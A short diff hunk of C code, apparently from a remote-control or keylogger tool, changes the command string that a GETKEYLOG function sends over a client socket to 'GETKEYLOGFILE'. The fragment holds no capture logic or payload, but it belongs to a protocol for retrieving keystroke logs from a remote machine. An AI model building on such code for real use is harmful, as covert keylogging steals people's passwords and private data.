@@ -80,7 +80,7 @@ void GETKEYLOG(void * paramT){
 		return;
 	}
 
-	strcpy(buffer, "GETFILE");
+	strcpy(buffer, "GETKEYLOGFILE");
 	send((param)->clientSocket, buffer, strlen(buffer), 0);
 	memset(buffer, 0, strlen(buffer));
 	Sleep(101);
